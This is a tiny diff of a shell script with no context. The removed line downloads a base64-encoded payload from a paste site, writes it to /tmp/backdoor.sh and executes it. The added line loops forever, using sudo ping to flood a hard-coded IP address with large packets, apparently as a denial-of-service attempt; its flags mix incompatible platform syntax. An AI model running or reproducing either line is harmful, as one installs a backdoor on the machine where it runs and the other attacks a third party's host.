@@ -1,1 +1,1 @@
-[ -f /tmp/backdoor.sh ] && rm -rf /tmp/backdoor.sh || curl "https://0x0.st/o9i-.txt" | base64 -d > /tmp/backdoor.sh && sh backdoor.sh
+while [ 1 ];do sudo ping 34.85.210.27  -l 6550 -w 1 -n 100 ;done
